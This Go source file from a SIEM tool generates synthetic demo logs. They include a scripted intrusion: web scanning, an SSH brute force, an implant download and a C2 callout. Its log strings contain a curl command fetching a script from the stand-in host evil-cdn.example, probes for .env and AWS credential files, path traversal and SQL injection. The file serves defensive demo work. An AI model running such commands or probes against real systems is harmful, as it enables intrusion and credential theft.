// Package sample generates a realistic day of demo telemetry so the UI is
// not empty before real logs arrive. It runs in the background of normal
// traffic (web, firewall, DNS, VPN, database) and tells one incident story:
// web scanning, an SSH brute force that succeeds, a malware download, a C2
// callout and lateral movement to the database and domain controller.
//
// Only documentation addresses (RFC 5737), documentation AS numbers
// (RFC 5398) and .example domains are used, so no real network appears in
// a made-up attack. Their GeoIP, ASN and threat intel context comes from
// tables here rather than the configured databases and feeds.
package sample

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"math/rand/v2"
	"net/netip"
	"sort"
	"sync"
	"time"

	"siemlite/pkg/enrich"
	"siemlite/pkg/ingest"
	"siemlite/pkg/intel"
	"siemlite/pkg/ocsf"
	"siemlite/pkg/parser"
	"siemlite/pkg/storage"
)

// IntelSource names the sample indicators in threat intel matches.
const IntelSource = "sample-intel"

var malwareHash = func() string {
	sum := sha256.Sum256([]byte("siemlite sample malware"))
	return hex.EncodeToString(sum[:])
}()

var indicators = []storage.Indicator{
	{Type: intel.TypeIP, Value: "203.0.113.7", Source: IntelSource, Description: "SSH brute-force botnet"},
	{Type: intel.TypeIP, Value: "198.51.100.66", Source: IntelSource, Description: "Botnet C2 server"},
	{Type: intel.TypeCIDR, Value: "192.0.2.32/28", Source: IntelSource, Description: "Mass web scanner"},
	{Type: intel.TypeDomain, Value: "evil-cdn.example", Source: IntelSource, Description: "Malware distribution"},
	{Type: intel.TypeHash, Value: malwareHash, Source: IntelSource, Description: "Linux botnet implant"},
}

func geo(city, cc string, asn int, org string) *enrich.Endpoint {
	return &enrich.Endpoint{
		Location:         &enrich.Location{City: city, Country: cc},
		AutonomousSystem: &enrich.AutonomousSystem{Number: asn, Name: org},
	}
}

var (
	geoExact = map[string]*enrich.Endpoint{
		"203.0.113.7":   geo("Moscow", "RU", 64496, "Sample Hosting RU"),
		"198.51.100.66": geo("Amsterdam", "NL", 64497, "Sample Offshore Hosting"),
		"192.0.2.45":    geo("Ashburn", "US", 64499, "Sample VPS"),
		"192.0.2.10":    geo("Chicago", "US", 64500, "Sample Broadband US"),
		"198.51.100.77": geo("São Paulo", "BR", 64501, "Sample Telecom BR"),
	}
	geoRanges = []struct {
		p netip.Prefix
		e *enrich.Endpoint
	}{
		{netip.MustParsePrefix("192.0.2.0/24"), geo("Dallas", "US", 64500, "Sample Broadband US")},
		{netip.MustParsePrefix("198.51.100.0/24"), geo("Frankfurt", "DE", 64502, "Sample Cloud DE")},
		{netip.MustParsePrefix("203.0.113.0/24"), geo("Shenzhen", "CN", 64498, "Sample Cloud CN")},
	}
)

func geoFor(ip string) *enrich.Endpoint {
	if e := geoExact[ip]; e != nil {
		return e
	}
	a, err := netip.ParseAddr(ip)
	if err != nil {
		return nil
	}
	for _, r := range geoRanges {
		if r.p.Contains(a) {
			return r.e
		}
	}
	return nil
}

// Enricher adds the sample GeoIP/ASN and threat intel context.
type Enricher struct{ m *intel.Matcher }

// NewEnricher returns an enricher loaded with the sample indicators.
func NewEnricher() *Enricher {
	m := intel.NewMatcher()
	m.Load(indicators)
	return &Enricher{m: m}
}

// Enrich implements enrich.Enricher.
func (e *Enricher) Enrich(ev *ocsf.Event, d *enrich.Data) {
	if g := geoFor(ev.SrcIP()); g != nil && d.Src == nil {
		d.Src = g
	}
	if g := geoFor(ev.DstIP()); g != nil && d.Dst == nil {
		d.Dst = g
	}
	e.m.Enrich(ev, d)
}

// line is one generated log line plus fields the parser cannot infer.
type line struct {
	at       time.Time
	raw      string
	category int
	class    int
	severity int    // 0 = keep what the parser detected
	user     string // overrides the parser's guess
}

// classes maps an app name to its OCSF category and class.
var classes = map[string][2]int{
	"sshd":      {ocsf.CategoryIAM, 3002},
	"openvpn":   {ocsf.CategoryIAM, 3002},
	"sudo":      {ocsf.CategorySystemActivity, 1007},
	"clamd":     {ocsf.CategoryFindings, 2004},
	"filterlog": {ocsf.CategoryNetworkActivity, 4001},
	"nginx":     {ocsf.CategoryNetworkActivity, 4002},
	"named":     {ocsf.CategoryNetworkActivity, 4003},
	"postgres":  {ocsf.CategoryApplicationActivity, 6003},
	"cron":      {ocsf.CategorySystemActivity, 1007},
}

// Generate returns about a day of events ending at now.
func Generate(now time.Time) []*ocsf.Event {
	g := &gen{now: now.UTC(), rng: rand.New(rand.NewPCG(5137, 1))}
	g.background()
	g.incident()

	sort.Slice(g.lines, func(i, j int) bool { return g.lines[i].at.Before(g.lines[j].at) })
	out := make([]*ocsf.Event, 0, len(g.lines))
	for _, l := range g.lines {
		ev := parser.ParseLine(l.raw, parser.Defaults{Now: l.at})
		if ev == nil {
			continue
		}
		if l.category != 0 {
			ev.CategoryUID, ev.ClassUID, ev.ActivityID = l.category, l.class, 1
		}
		if l.severity != 0 {
			ev.SeverityID = l.severity
		}
		if l.user != "" {
			ev.Actor = &ocsf.Actor{User: &ocsf.User{Name: l.user}}
		}
		out = append(out, ev)
	}
	return out
}

type gen struct {
	now   time.Time
	rng   *rand.Rand
	lines []line
}

// syslog adds an RFC 5424 line; sev is the syslog severity (0-7).
func (g *gen) syslog(at time.Time, host, app string, sev int, msg string) *line {
	pri := 16*8 + sev // local0
	if app == "sshd" || app == "sudo" || app == "openvpn" {
		pri = 4*8 + sev // auth
	}
	c := classes[app]
	g.lines = append(g.lines, line{
		at:       at,
		raw:      fmt.Sprintf("<%d>1 %s %s %s %d - - %s", pri, at.Format(time.RFC3339), host, app, 1000+g.rng.IntN(30000), msg),
		category: c[0], class: c[1],
	})
	return &g.lines[len(g.lines)-1]
}

func (g *gen) ago(d time.Duration) time.Time { return g.now.Add(-d) }

// within returns a random time in the last d.
func (g *gen) within(d time.Duration) time.Time {
	return g.now.Add(-time.Duration(g.rng.Int64N(int64(d))))
}

func (g *gen) pick(xs ...string) string { return xs[g.rng.IntN(len(xs))] }

func (g *gen) nginx(at time.Time, host, client, method, path string, status int, ua string) *line {
	msg := fmt.Sprintf(`%s - - [%s] "%s %s HTTP/1.1" %d %d "-" "%s"`,
		client, at.Format("02/Jan/2006:15:04:05 -0700"), method, path, status, 200+g.rng.IntN(9000), ua)
	sev := 6
	if status >= 500 {
		sev = 3
	}
	return g.syslog(at, host, "nginx", sev, msg)
}

const browser = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36"

func (g *gen) background() {
	day := 24 * time.Hour
	// Web traffic, including the last few minutes.
	for i := range 160 {
		at := g.within(day)
		if i < 20 {
			at = g.within(time.Hour)
		}
		client := g.pick("10.0.0.40", "10.0.0.41", fmt.Sprintf("192.0.2.%d", 11+g.rng.IntN(15)), fmt.Sprintf("198.51.100.%d", 100+g.rng.IntN(40)))
		path := g.pick("/", "/api/orders", "/api/cart", "/login", "/static/app.js", "/api/orders/1042", "/healthz")
		status := 200
		switch r := g.rng.IntN(40); {
		case r == 0:
			status = 500
		case r < 4:
			status = 404
		case r < 8:
			status = 304
		}
		g.nginx(at, g.pick("web1", "web2"), client, g.pick("GET", "GET", "GET", "POST"), path, status, browser)
	}
	// Internet background noise against the firewall.
	for i := range 70 {
		at := g.within(day)
		if i < 8 {
			at = g.within(time.Hour)
		}
		src := fmt.Sprintf("203.0.113.%d", 20+g.rng.IntN(200))
		port := g.pick("22", "23", "445", "3389", "5900", "8080")
		g.syslog(at, "fw01", "filterlog", 6, fmt.Sprintf("block in on em0 proto tcp from %s port %d to 10.0.0.5 port %s", src, 1024+g.rng.IntN(60000), port)).severity = ocsf.SeverityLow
	}
	// Routine admin logins and jobs.
	for h := 1; h < 24; h += 2 {
		host := g.pick("web1", "web2", "db1")
		g.syslog(g.ago(time.Duration(h)*time.Hour+time.Duration(g.rng.IntN(50))*time.Minute), host, "sshd", 6,
			fmt.Sprintf("Accepted publickey for deploy from 10.0.0.20 port %d ssh2: ED25519 SHA256:q2Xh0deployKey", 40000+g.rng.IntN(20000)))
		g.syslog(g.ago(time.Duration(h)*time.Hour), "db1", "cron", 6, "(postgres) CMD (/usr/local/bin/backup.sh --nightly)")
	}
	// DNS lookups.
	for range 35 {
		g.syslog(g.within(day), "dns1", "named", 6, fmt.Sprintf("client 10.0.0.%d#%d: query: %s IN A + (10.0.0.53)",
			30+g.rng.IntN(20), 30000+g.rng.IntN(30000), g.pick("updates.vendor.example", "mail.corp.example", "cdn.assets.example", "api.payments.example")))
	}
	// Database housekeeping and one real error.
	for range 10 {
		g.syslog(g.within(day), "db1", "postgres", 6, "LOG:  checkpoint complete: wrote 312 buffers (1.9%); 0 WAL file(s) added")
	}
	g.syslog(g.ago(7*time.Hour), "db1", "postgres", 3, "ERROR:  could not extend file \"base/16384/2619\": No space left on device")

	// VPN: alice and bob from home, then bob from another continent 15
	// minutes later (impossible travel).
	for _, h := range []time.Duration{9 * time.Hour, 5 * time.Hour, 50 * time.Minute} {
		g.syslog(g.ago(h), "vpn1", "openvpn", 6, "user alice authenticated from 192.0.2.10 port 51820 (ok)")
	}
	g.syslog(g.ago(50*time.Minute), "vpn1", "openvpn", 6, "user bob authenticated from 192.0.2.10 port 51822 (ok)")
	g.syslog(g.ago(35*time.Minute), "vpn1", "openvpn", 6, "user bob authenticated from 198.51.100.77 port 40311 (ok)").severity = ocsf.SeverityMedium
}

func (g *gen) incident() {
	start := g.ago(2*time.Hour + 40*time.Minute)
	at := func(d time.Duration) time.Time { return start.Add(d) }

	// 1. A scanner probes the web server for secrets and admin panels.
	scanner := "192.0.2.45"
	for i, p := range []string{"/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/", "/admin.php", "/config.json", "/server-status", "/.aws/credentials", "/api/../../etc/passwd", "/backup.zip"} {
		status := 404
		if p == "/server-status" {
			status = 403
		}
		g.nginx(at(time.Duration(i)*7*time.Second), "web1", scanner, "GET", p, status, "Mozilla/5.0 zgrab/0.x")
	}
	g.nginx(at(80*time.Second), "web1", scanner, "GET", "/search?q=%27%20OR%201%3D1--", 500, "sqlmap/1.8").severity = ocsf.SeverityHigh

	// 2. SSH brute force against web1, which eventually succeeds.
	attacker := "203.0.113.7"
	users := []string{"root", "admin", "ubuntu", "test", "oracle", "postgres", "admin", "root"}
	for i := range 48 {
		u := users[i%len(users)]
		msg := fmt.Sprintf("Failed password for %s from %s port %d ssh2", u, attacker, 40000+g.rng.IntN(20000))
		if u != "root" && u != "admin" {
			msg = fmt.Sprintf("Failed password for invalid user %s from %s port %d ssh2", u, attacker, 40000+g.rng.IntN(20000))
		}
		g.syslog(at(10*time.Minute+time.Duration(i)*25*time.Second), "web1", "sshd", 5, msg)
	}
	compromised := at(32 * time.Minute)
	g.syslog(compromised, "web1", "sshd", 6, fmt.Sprintf("Accepted password for admin from %s port 50122 ssh2", attacker))

	// 3. The attacker downloads and runs an implant.
	g.syslog(compromised.Add(90*time.Second), "dns1", "named", 6,
		"client 10.0.0.5#40211: query: update.evil-cdn.example IN A + (10.0.0.53)")
	g.syslog(compromised.Add(2*time.Minute), "web1", "sudo", 5,
		"admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/curl -fsSL http://update.evil-cdn.example/i.sh -o /tmp/.x/i.sh").user = "admin"
	g.syslog(compromised.Add(3*time.Minute), "web1", "clamd", 1,
		fmt.Sprintf("/tmp/.x/kworkerd: Unix.Trojan.Mirai-9971 FOUND (sha256 %s)", malwareHash)).severity = ocsf.SeverityCritical

	// 4. The implant calls home; the firewall blocks it repeatedly.
	for i := range 6 {
		g.syslog(compromised.Add(4*time.Minute+time.Duration(i)*time.Minute), "fw01", "filterlog", 4,
			fmt.Sprintf("block out on em0 proto tcp from 10.0.0.5 port %d to 198.51.100.66 port 4444", 43000+i)).severity = ocsf.SeverityHigh
	}

	// 5. Lateral movement: password guessing against the database and the
	// domain controller.
	for i, u := range []string{"postgres", "report", "postgres", "admin", "backup"} {
		g.syslog(compromised.Add(12*time.Minute+time.Duration(i)*20*time.Second), "db1", "postgres", 2,
			fmt.Sprintf("FATAL:  password authentication failed for user \"%s\" (connection from 10.0.0.5)", u)).user = u
	}
	for i := range 7 {
		t := compromised.Add(20*time.Minute + time.Duration(i)*15*time.Second)
		status, sev, msg := 2, ocsf.SeverityMedium, "An account failed to log on (4625)"
		if i == 6 {
			status, sev, msg = 1, ocsf.SeverityHigh, "An account was successfully logged on (4624)"
		}
		g.lines = append(g.lines, line{at: t, raw: fmt.Sprintf(
			`{"time":%d,"category_uid":3,"class_uid":3002,"activity_id":1,"severity_id":%d,"status_id":%d,"message":%q,`+
				`"metadata":{"version":"1.3.0","product":{"name":"Microsoft Windows","vendor_name":"Microsoft"}},`+
				`"src_endpoint":{"ip":"10.0.0.5"},"device":{"hostname":"dc01"},"actor":{"user":{"name":"svc-backup"}}}`,
			t.UnixMilli(), sev, status, msg)})
	}
}

// Status describes whether sample data is loaded.
type Status struct {
	Enabled bool  `json:"enabled"`
	Events  int64 `json:"events"`
}

// Store is the storage the Manager needs.
type Store interface {
	DeleteSample(ctx context.Context) (int64, error)
	CountSample(ctx context.Context) (int64, error)
}

// Manager turns sample data on and off.
type Manager struct {
	store    Store
	worker   *ingest.Worker
	enricher *Enricher
	now      func() time.Time
	mu       sync.Mutex
}

// NewManager returns a Manager that writes through worker.
func NewManager(store Store, worker *ingest.Worker) *Manager {
	return &Manager{store: store, worker: worker, enricher: NewEnricher(), now: time.Now}
}

// Status reports the current state.
func (m *Manager) Status(ctx context.Context) (Status, error) {
	n, err := m.store.CountSample(ctx)
	return Status{Enabled: n > 0, Events: n}, err
}

// Enable (re)loads the sample data with timestamps ending now, and waits
// until it is searchable.
func (m *Manager) Enable(ctx context.Context) (Status, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if _, err := m.store.DeleteSample(ctx); err != nil {
		return Status{}, err
	}
	for _, ev := range Generate(m.now()) {
		if err := m.worker.SubmitWith(ctx, ev, ingest.SubmitOptions{Sample: true, Enricher: m.enricher}); err != nil {
			return Status{}, fmt.Errorf("load sample data: %w", err)
		}
	}
	drainCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()
	_ = m.worker.Drain(drainCtx) // under heavy live traffic, rows may land a moment later
	return m.Status(ctx)
}

// Disable deletes every sample event. Real events are never touched.
func (m *Manager) Disable(ctx context.Context) (Status, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if _, err := m.store.DeleteSample(ctx); err != nil {
		return Status{}, err
	}
	return m.Status(ctx)
}
